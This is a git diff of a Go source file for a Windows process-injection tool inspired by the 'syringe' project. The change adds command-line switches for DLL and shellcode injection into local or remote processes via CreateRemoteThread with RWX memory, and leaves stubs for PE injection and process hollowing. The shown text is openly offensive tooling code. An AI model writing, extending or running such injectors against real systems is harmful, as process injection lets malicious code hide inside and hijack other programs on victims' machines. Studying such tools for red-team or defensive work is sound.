@@ -5,11 +5,11 @@ package main
 *	inspired by syringe: https://github.com/securestate/syringe
 *	using https://github.com/golang/go/wiki/WindowsDLLs for "pinvoke" help
 
-	implement dll injection (local & remote process) - use loadlibrary & reflection
-	implement shellcode injection (local & remote process)
+	implement dll injection (local & remote process) - use loadlibrary
+		todo: reflection
+	implement shellcode injection (local & remote process) - done (uses createthread/createremotethread with RWX)
 	implement pe injection (remote process)
-
-	Working remote & local DLL injection w/ loadlibrary + dll path 12/19/21
+		todo: implement pe injection & process hollowing
 
 	powershell to hunt for PID:
 
@@ -223,9 +223,7 @@ func InjectShellcode(shellcode []byte, dwProcessID int) {
 	//todo: add more granular checks for success after each function call; figure out why createremotethread does not exit gracefully
 
 	var hProc uintptr
-	//var hRemoteThread uintptr
 	var pRemoteBuff uintptr
-	//var pLoadLibraryAddr uintptr
 
 	hProc = OpenProcess(CREATE_THREAD_ACCESS, 0, uintptr(dwProcessID))
 
@@ -257,19 +255,43 @@ func InjectPE(pPE string, dwProcessID int) {
 	fmt.Println("todo")
 }
 
+func HollowPE(pPE string, dwProcessID int) {
+	fmt.Println("todo")
+}
+
 //main etc.
 func main() {
 	defer syscall.FreeLibrary(kernel32)
 
 	//rethink argument parsing - need conditional branching + help with OS path for args?
 
-	dll := flag.String("dll", "test", "path to dll for injection")
+	file := flag.String("file", "test.dll", "path to file for injection (.dll/.bin)")
+	technique := flag.String("technique", "dll", "technique for injection (dll/exe/shellcode)")
 	pid := flag.Int("pid", 0, "Process ID to inject into")
 	flag.Parse()
 	fmt.Println(pid)
 
-	data, _ := ioutil.ReadFile(*dll)
-	InjectShellcode(data, *pid)
+	data, _ := ioutil.ReadFile(*file)
+
+	if *technique == "dll" {
+		if *pid == 0 {
+			LoadDLL(*file)
+		} else {
+			InjectDLL(*file, *pid)
+		}
+	} else if *technique == "shellcode" {
+		if *pid == 0 {
+			ExecuteShellcode(data)
+		} else {
+			InjectShellcode(data, *pid)
+		}
+	} else if *technique == "pe" {
+		fmt.Println("todo")
+	} else {
+		fmt.Println("[!!] Error: technique must be dll, shellcode, or pe")
+	}
+
+	//InjectShellcode(data, *pid)
 	//ExecuteShellcode(data)
 	//LoadDLL(*dll)
 	//InjectDLL(*dll, *pid)
